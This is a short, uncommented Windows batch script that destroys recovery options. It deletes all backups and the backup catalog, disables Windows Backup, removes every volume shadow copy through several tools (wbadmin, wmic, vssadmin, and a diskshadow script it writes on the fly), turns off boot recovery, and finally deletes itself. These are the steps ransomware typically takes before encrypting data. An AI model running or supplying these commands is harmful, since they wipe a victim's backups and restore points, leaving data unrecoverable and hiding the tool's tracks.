wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0
wbadmin DELETE BACKUP -keepVersions:0
wmic SHADOWCOPY DELETE
vssadmin Delete Shadows /All /Quiet
bcdedit /set {default} recoveryenabled No
bcdedit /set {default} bootstatuspolicy ignoreallfailures
vssadmin list shadows

cmd.exe /C wbadmin STOP job
cmd.exe /C wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0 -quiet
cmd.exe /C wbadmin DELETE CATALOG -quiet
cmd.exe /C wbadmin DISABLE backup
cmd.exe /C bcdedit /set {default} recoveryenabled No
cmd.exe /C bcdedit /set {default} bootstatuspolicy ignoreallfailures
cd "%~dp0"
echo delete shadows all>>sc.txt
echo exit>>sc.txt
cmd.exe /C diskshadow -s sc.txt
del /f "%~dp0sc.txt"
pause
del %0